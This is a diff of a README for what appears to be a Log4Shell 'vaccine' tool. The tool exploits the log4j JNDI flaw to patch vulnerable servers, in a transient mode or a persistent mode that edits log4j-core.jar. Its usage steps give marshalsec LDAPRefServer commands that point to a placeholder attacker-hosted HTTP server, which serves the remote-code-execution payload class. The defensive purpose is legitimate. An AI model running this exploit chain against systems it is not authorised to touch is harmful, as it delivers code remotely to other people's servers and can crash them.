@@ -45,6 +45,21 @@ Then, the log4j jarfile will be remade and patched. The patch is included in thi
 git repository, however it is not needed in the final build because the real patch
 is included in the payload as Base64.
 
+In persistence mode (see [below](#transient-vs-persistent-mode)), the payload additionally attempts to locate the `log4j-core.jar`,
+remove the `JndILookup` class, and modify the PluginCache to completely remove the JNDI plugin. Upon subsequent JVM
+restarts the `JndiLookup` class cannot be found and log4j will not support for JNDI
+
+## Transient vs Persistent mode
+This package generates two flavors of the payload - Transient and Persistent. 
+In Transient mode, the payload modifies
+the current running JVM. The payload is very delicate to just touch the logger context and configuration. We thus
+believe the risk of using the Transient mode are very low on production environments.
+
+Persistent mode performs all the changes of the Transient mode and *in addition* searches for the jar from which `log4j`
+loads the `JndiLookup` class. It then attempts to modify this jar by removing the `JndiLookup` class as well as
+modifying the plugin registry. There is inherently more risk in this approach as if the `log4j-core.jar` becomes
+corrupted, the JVM may crash on start.
+
 ## How to use
 
 1. Download this repository and build it 
@@ -63,7 +78,8 @@ is included in the payload as Base64.
 
    2.2 `mvn package -DskipTests`
 
-   2.3 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCE"`
+   2.3 For Transient mode use - `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCETransient"`
+   2.4 For Persistent mode use - `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCEPersistent"`
 
 3. To immunize a server
 
